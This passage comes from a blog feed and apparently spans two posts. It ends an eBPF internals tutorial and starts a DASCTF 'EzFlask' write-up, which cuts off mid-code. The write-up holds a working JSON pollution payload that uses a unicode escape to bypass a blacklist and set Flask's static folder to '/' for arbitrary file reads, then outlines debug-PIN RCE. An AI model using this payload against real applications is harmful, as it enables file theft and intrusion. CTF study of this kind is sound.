BPF_LINK_DETACH<span class="token punctuation">,</span>  BPF_PROG_BIND_MAP<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令对应的表格</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class=""><h3 id="BPF-辅助函数"><a href="#BPF-辅助函数" class="headerlink" title="BPF 辅助函数"></a>BPF 辅助函数</h3><p>说完用户态程序的 bpf 系统调用格式，我们再来看看内核态的 eBPF 程序。</p><p>eBPF 程序并不能随意调用内核函数，因此，内核定义了一系列的辅助函数，用于 eBPF 程序与内核其他模块进行交互，这一个实现方式其实是通过 eBPF helpers 来做的。</p><p>比如，上一讲的 Hello World 示例中使用的 <code>bpf_trace_printk()</code> 就是最常用的一个辅助函数，用于向调试文件系统（<code>/sys/kernel/debug/tracing/trace_pipe</code>）写入调试信息。</p><p>这里补充一个知识点：从内核 5.13 版本开始，部分内核函数（如  <code>tcp_slow_start()</code>、<code>tcp_reno_ssthresh()</code>  等）也可以被 BPF 程序直接调用了，具体你可以查看<a class="link"   href="https://lwn.net/Articles/856005/" >这个链接<i class="fas fa-external-link-alt"></i></a>。 不过，这些函数只能在 TCP 拥塞控制算法的 BPF 程序中调用，此处不再做过多的介绍。</p><p>需要注意的是，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。比如，对于 Hello World 示例这类内核探针（kprobe）类型的 eBPF 程序，你可以在命令行中执行  <code>bpftool feature probe</code> ，来查询当前系统支持的辅助函数列表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ bpftool feature probe<span class="token punctuation">..</span>.eBPF helpers supported <span class="token keyword">for</span> program <span class="token builtin class-name">type</span> kprobe:  - bpf_map_lookup_elem  - bpf_map_update_elem  - bpf_map_delete_elem  - bpf_probe_read  - bpf_ktime_get_ns  - bpf_get_prandom_u32  - bpf_get_smp_processor_id  - bpf_tail_call  - bpf_get_current_pid_tgid  - bpf_get_current_uid_gid  - bpf_get_current_comm  - bpf_perf_event_read  - bpf_perf_event_output  - bpf_get_stackid  - bpf_get_current_task  - bpf_current_task_under_cgroup  - bpf_get_numa_node_id  - bpf_probe_read_str  - bpf_perf_event_read_value  - bpf_override_return  - bpf_get_stack  - bpf_get_current_cgroup_id  - bpf_map_push_elem  - bpf_map_pop_elem  - bpf_map_peek_elem  - bpf_send_signal  - bpf_probe_read_user  - bpf_probe_read_kernel  - bpf_probe_read_user_str  - bpf_probe_read_kernel_str<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于这些辅助函数的详细定义，你可以在命令行中执行  man bpf-helpers ，或者参考内核头文件  <a class="link"   href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L1463" >bpf.h - include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a>，来查看它们的详细定义和使用说明。为了方便掌握，我把常用的辅助函数整理成了一个表格，可以在需要时参考：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpfHelpersExcel.png" class=""><p>这其中，需要你特别注意的是以 <code>bpf_probe_read</code>  开头的一系列函数。在上一讲中已经提到，eBPF 内部的内存空间只有寄存器和栈。所以，要访问其他的内核空间或用户空间地址，就需要借助  <code>bpf_probe_read</code>  这一系列的辅助函数。这些函数会进行安全性检查，并禁止缺页中断的发生。</p><p>而在 eBPF 程序需要大块存储时，就不能像常规的内核代码那样去直接分配内存了，而是必须通过 BPF 映射（BPF Map）来完成。接下来，我带你看看 BPF 映射的具体原理。</p><h3 id="BPF-映射"><a href="#BPF-映射" class="headerlink" title="BPF 映射"></a>BPF 映射</h3><p>BPF 映射用于提供大块的键值存储，这些存储可被用户空间程序访问，进而获取 eBPF 程序的运行状态。eBPF 程序最多可以访问 64 个不同的 BPF 映射，并且不同的 eBPF 程序也可以通过相同的 BPF 映射来共享它们的状态。下图（图片来自docs.cilium.io）展示了  BPF 映射的基本使用方法。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsageOfBPFMap.png" class=""><p>在前面的 BPF 系统调用和辅助函数小节中，你也看到，有很多系统调用命令和辅助函数都是用来访问 BPF 映射的。我相信细心的你已经发现了：BPF 辅助函数中并没有 BPF 映射的创建函数，BPF 映射只能通过用户态程序的系统调用来创建。比如，你可以通过下面的示例代码来创建一个 BPF 映射，并返回映射的文件描述符：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bpf_create_map</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">bpf_map_type</span> map_type<span class="token punctuation">,</span>       <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key_size<span class="token punctuation">,</span>       <span class="token keyword">unsigned</span> <span class="token keyword">int</span> value_size<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> max_entries<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>map_type <span class="token operator">=</span> map_type<span class="token punctuation">,</span>    <span class="token punctuation">.</span>key_size <span class="token operator">=</span> key_size<span class="token punctuation">,</span>    <span class="token punctuation">.</span>value_size <span class="token operator">=</span> value_size<span class="token punctuation">,</span>    <span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">bpf</span><span class="token punctuation">(</span>BPF_MAP_CREATE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这其中，最关键的是设置映射的类型。内核头文件 <code>include/uapi/linux/bpf.h</code> 中的  <code>bpf_map_type</code> 定义了所有支持的映射类型，你可以使用如下的 bpftool 命令，来查询当前系统支持哪些映射类型：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ bpftool feature probe <span class="token operator">|</span> <span class="token function">grep</span> map_typeeBPF map_type <span class="token builtin class-name">hash</span> is availableeBPF map_type array is availableeBPF map_type prog_array is availableeBPF map_type perf_event_array is availableeBPF map_type percpu_hash is availableeBPF map_type percpu_array is availableeBPF map_type stack_trace is available<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在下面的表格中，整理了几种最常用的映射类型及其功能和使用场景：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsualMapSecne.png" class=""><p>如果你的 eBPF 程序使用了 BCC 库，你还可以使用预定义的宏来简化 BPF 映射的创建过程。比如，对哈希表映射来说，BCC 定义了  <code>BPF_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code>，因此，你就可以通过下面的几种方法来创建一个哈希表映射：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 使用默认参数 key_type=u64, leaf_type=u64, size=10240</span><span class="token function">BPF_HASH</span><span class="token punctuation">(</span>stats<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用自定义key类型，保持默认 leaf_type=u64, size=10240</span><span class="token keyword">struct</span> <span class="token class-name">key_t</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">BPF_HASH</span><span class="token punctuation">(</span>counts<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">key_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 自定义所有参数</span><span class="token function">BPF_HASH</span><span class="token punctuation">(</span>cpu_time<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span><span class="token punctuation">,</span> <span class="token class-name">uint64_t</span><span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了创建之外，映射的删除也需要你特别注意。BPF 系统调用中并没有删除映射的命令，这是因为 <strong>BPF 映射会在用户态程序关闭文件描述符的时候自动删除（即close(fd) ）</strong>。 如果你想在程序退出后还保留映射，就需要调用  <code>BPF_OBJ_PIN</code> 命令，将映射挂载到 <code>/sys/fs/bpf</code> 中。</p><p>在调试 BPF 映射相关的问题时，你还可以通过 bpftool 来查看或操作映射的具体内容。比如，你可以通过下面这些命令创建、更新、输出以及删除映射：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//创建一个哈希表映射，并挂载到/sys/fs/bpf/stats_map(Key和Value的大小都是2字节)</span>bpftool map create <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>bpf<span class="token operator">/</span>stats_map type hash key <span class="token number">2</span> value <span class="token number">2</span> entries <span class="token number">8</span> name stats_map<span class="token comment">//查询系统中的所有映射</span>bpftool map<span class="token comment">//示例输出</span><span class="token comment">//340: hash  name stats_map  flags 0x0</span><span class="token comment">//        key 2B  value 2B  max_entries 8  memlock 4096B</span><span class="token comment">//向哈希表映射中插入数据</span>bpftool map update name stats_map key <span class="token number">0xc1</span> <span class="token number">0xc2</span> value <span class="token number">0xa1</span> <span class="token number">0xa2</span><span class="token comment">//查询哈希表映射中的所有数据</span> bpftool map dump name stats_map<span class="token comment">//示例输出</span><span class="token comment">//key: c1 c2  value: a1 a2</span><span class="token comment">//Found 1 element</span><span class="token comment">//删除哈希表映射</span>rm <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>bpf<span class="token operator">/</span>stats_map<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/MapBasicUse.png" class=""><h3 id="BPF-类型格式（BTF）"><a href="#BPF-类型格式（BTF）" class="headerlink" title="BPF 类型格式（BTF）"></a>BPF 类型格式（BTF）</h3><p>了解过 BPF 辅助函数和映射之后，我们再来看一个开发 eBPF 程序时最常碰到的问题：内核数据结构的定义。</p><p>在安装 BCC 工具的时候，你可能就注意到了，内核头文件 <code>linux-headers-$(uname -r)</code> 也是必须要安装的一个依赖项。这是因为 BCC 在编译 eBPF 程序时，需要从内核头文件中找到相应的内核数据结构定义。这样，你在调用 <code>bpf_probe_read</code> 时，才能从内存地址中提取到正确的数据类型。</p><p>但是，编译时依赖内核头文件也会带来很多问题。主要有这三个方面：</p><ul><li>首先，在开发 eBPF 程序时，为了获得内核数据结构的定义，就需要引入一大堆的内核头文件；</li><li>其次，内核头文件的路径和数据结构定义在不同内核版本中很可能不同。因此，你在升级内核版本时，就会遇到找不到头文件和数据结构定义错误的问题；</li><li>最后，在很多生产环境的机器中，出于安全考虑，并不允许安装内核头文件，这时就无法得到内核数据结构的定义。<strong>在程序中重定义数据结构</strong>虽然可以暂时解决这个问题，但也很容易把使用着错误数据结构的 eBPF 程序带入新版本内核中运行。</li></ul><p>那么，这么多的问题该怎么解决呢？不用担心，BPF 类型格式（BPF Type Format, BTF）的诞生正是为了解决这些问题。</p><p>从内核 5.2 开始，只要开启了 <code>CONFIG_DEBUG_INFO_BTF</code>，在编译内核时，内核数据结构的定义就会自动内嵌在内核二进制文件 vmlinux 中。并且，你还可以借助下面的命令，把这些数据结构的定义导出到一个头文件中（通常命名为 <code>vmlinux.h</code>）:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bpftool btf dump <span class="token function">file</span> /sys/kernel/btf/vmlinux <span class="token function">format</span> c <span class="token operator">></span> vmlinux.h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图（图片来自 GRANT SELTZER 博客）所示，有了内核数据结构的定义，你在开发 eBPF 程序时只需要引入一个 <code>vmlinux.h</code> 即可，不用再引入一大堆的内核头文件了。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/vmlinuxH.png" class=""><p>同时，借助 BTF、bpftool 等工具，我们也可以更好地了解 BPF 程序的内部信息，这也会让调试变得更加方便。比如，在查看 BPF 映射的内容时，你可以直接看到结构化的数据，而不只是十六进制数值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># bpftool map dump id 386</span><span class="token punctuation">[</span>  <span class="token punctuation">&#123;</span>      <span class="token string">"key"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,      <span class="token string">"value"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>          <span class="token string">"eth0"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>              <span class="token string">"value"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,              <span class="token string">"ifindex"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,              <span class="token string">"mac"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决了内核数据结构的定义问题，接下来的问题就是，<strong>如何让 eBPF 程序在内核升级之后，不需要重新编译就可以直接运行</strong>。eBPF 的一次编译到处执行（Compile Once Run Everywhere，简称 CO-RE）项目借助了 BTF 提供的调试信息，再通过下面的两个步骤，使得 eBPF 程序可以适配不同版本的内核：</p><ul><li>第一，通过对 BPF 代码中的访问偏移量进行重写，解决了不同内核版本中数据结构偏移量不同的问题；</li><li>第二，在 libbpf 中预定义不同内核版本中的数据结构的修改，解决了不同内核中数据结构不兼容的问题。</li></ul><p>BTF 和一次编译到处执行带来了很多的好处，但你也需要注意这一点：它们都要求比较新的内核版本（&gt;&#x3D;5.2），并且需要非常新的发行版（如 Ubuntu 20.10+、RHEL 8.2+ 等）才会默认打开内核配置 <code>CONFIG_DEBUG_INFO_BTF</code>。对于旧版本的内核，虽然它们不会再去内置 BTF 的支持，但开源社区正在尝试通过 BTFHub 等方法，为它们提供 BTF 调试信息。</p><h3 id="小结-eBPF-程序是怎么跟进程进行交互的"><a href="#小结-eBPF-程序是怎么跟进程进行交互的" class="headerlink" title="小结 eBPF 程序是怎么跟进程进行交互的"></a>小结 eBPF 程序是怎么跟进程进行交互的</h3><p>一个完整的 eBPF 程序，通常包含用户态和内核态两部分：用户态程序需要通过 BPF 系统调用跟内核进行交互，进而完成 eBPF 程序加载、事件挂载以及映射创建和更新等任务；而在内核态中，eBPF 程序也不能任意调用内核函数，而是需要通过 BPF 辅助函数完成所需的任务。尤其是在访问内存地址的时候，必须要借助  <code>bpf_probe_read</code> 系列函数读取内存数据，以确保内存的安全和高效访问。</p><p>在 eBPF 程序需要大块存储时，我们还需要根据应用场景，引入特定类型的 BPF 映射，并借助它向用户空间的程序提供运行状态的数据。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术与实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 运行原理，eBPF 学习（二）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>2023 DASCTF 七月赛&amp;0x401 WP</title>
    <link href="https://drun1baby.github.io/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/"/>
    <id>https://drun1baby.github.io/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/</id>
    <published>2023-08-03T03:13:18.000Z</published>
    <updated>2023-08-06T03:09:40.753Z</updated>
    
    <content type="html"><![CDATA[<p>有点赶，含一道复现</p><span id="more"></span><h1 id="DASCTF-七月赛-x-0x401-CTF"><a href="#DASCTF-七月赛-x-0x401-CTF" class="headerlink" title="DASCTF 七月赛 x 0x401 CTF"></a>DASCTF 七月赛 x 0x401 CTF</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token keyword">from</span> secret <span class="token keyword">import</span> black_list<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">""</span>        self<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>username <span class="token operator">==</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>password <span class="token operator">==</span> data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>Users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>            data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"password"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>            User <span class="token operator">=</span> user<span class="token punctuation">(</span><span class="token punctuation">)</span>            merge<span class="token punctuation">(</span>data<span class="token punctuation">,</span> User<span class="token punctuation">)</span>            Users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>User<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>        <span class="token keyword">return</span> <span class="token string">"Register Success"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Register Failed"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"password"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Login Failed"</span>            <span class="token keyword">for</span> user <span class="token keyword">in</span> Users<span class="token punctuation">:</span>                <span class="token keyword">if</span> user<span class="token punctuation">.</span>check<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>                    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>                    <span class="token keyword">return</span> <span class="token string">"Login Success"</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Login Failed"</span>    <span class="token keyword">return</span> <span class="token string">"Login Failed"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5010</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到 <code>merge()</code> 的时候就很容易想到是原型链污染了</p><p><a class="link"   href="https://tttang.com/archive/1876" >https://tttang.com/archive/1876<i class="fas fa-external-link-alt"></i></a></p><p>污染 flask 的 <code>_static_folder</code> 为 <code>/</code> 就可以进行目录穿越了。</p><p>读取 secret.py 文件，发现其中的 blacklist 为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'__init__'</span><span class="token punctuation">,</span> <span class="token string">b'jinja'</span><span class="token punctuation">,</span> <span class="token string">b'black_list'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造部分 PoC</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init\u005f_"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样子之后就可以进行任意文件读取了</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>能到读到 <code>proc/1/cmdline</code></p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/cmdline1.png" class=""><p>再去读 flag</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag1.png" class=""><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>队里有师傅做了预期解</p><p>这里的思路是通过污染 <code>__file__</code> 为 flag，从而达到访问 <code>/</code> 的时候就访问了 <code>/flag</code>，但是由于非预期解这里可以看到 flag 名并不是这一个，但是题目开了 debug，我们可以通过计算 debug pin 码 RCE</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/debugPin.png" class=""><p>读 <code>/proc/self/status</code> 的到 uid0，也就是用户为 root</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/statusRoot.png" class=""><p>生成 pin</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span 